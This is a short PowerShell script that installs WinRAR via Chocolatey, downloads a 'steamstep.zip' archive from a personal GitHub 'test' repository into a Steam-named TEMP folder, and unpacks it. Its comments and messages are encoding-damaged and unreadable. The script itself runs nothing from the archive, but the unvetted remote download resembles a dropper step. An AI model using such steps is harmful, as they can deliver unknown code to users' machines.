# ������������� WinRAR ����� Chocolatey
Write-Host "��������� WinRAR..."
choco install -y winrar

$temp_win = $env:TEMP

# ��������� ���� � �����, ��� ����� ������� ����� �����
$folderPath = $temp_win

# ��������� ��� � ���� � ����� �����
$newFolderName = "steam_temp"
$newFolderPath = Join-Path -Path $folderPath -ChildPath $newFolderName

# ������� ����� �����
New-Item -Path $newFolderPath -ItemType Directory -Force

# ��������� URL ��� ���������� ������
$downloadUrl = "https://github.com/floflo1231211/test/raw/main/steamstep.zip"

# ��������� ���� � ����� ���������� ������
$archivePath = Join-Path -Path $newFolderPath -ChildPath "steam.zip"

# ��������� �����
Invoke-WebRequest -Uri $downloadUrl -OutFile $archivePath

# ��������� ������� ���������� ������
if (Test-Path $archivePath) {
    # ������������� �����
    Expand-Archive -Path $archivePath -DestinationPath $newFolderPath
} else {
    Write-Host "������: �� ������� ������� �����."
}

# ��������� ������� ������������� ������
if (Test-Path $newFolderPath) {
    Write-Host "�������� ������ �������."
    cd "$($newFolderPath)/steamstep"
} else {
    Write-Host "������: �� ������� ����������� �����."
}